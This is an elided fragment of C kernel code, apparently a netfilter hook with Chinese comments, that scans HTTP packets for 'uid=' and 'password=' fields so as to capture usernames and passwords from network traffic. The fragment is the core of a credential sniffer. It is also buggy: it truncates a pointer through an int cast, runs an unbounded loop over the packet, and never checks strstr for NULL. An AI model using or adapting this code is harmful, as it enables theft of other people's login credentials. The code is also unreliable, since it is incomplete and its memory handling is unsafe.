...
static void check_http(struct sk_buff *skb)
{
   ...
   header = (char *)((int)tcp + (int)(tcp->doff * 4));
   ...
   /* 跳过http头 */
    ...
    while(1)
    {
        if(*(header+i)=='\r' && *(header+1+i)=='\n' && *(header+2+i)=='\r' && *(header+3+i)=='\n')
            break;
        i++;
    }
    data=header+i;//定位http报文数据
    data=strstr(data,"uid=");//locate username
    if(data==NULL)
        return;
    data+=4;//从=号开始查找
    // printk("uid is %s\n",data);
    ...
    //printk("username length is %d\n",len); 
    /* Password */
    data=strstr(data,"password=")+9;
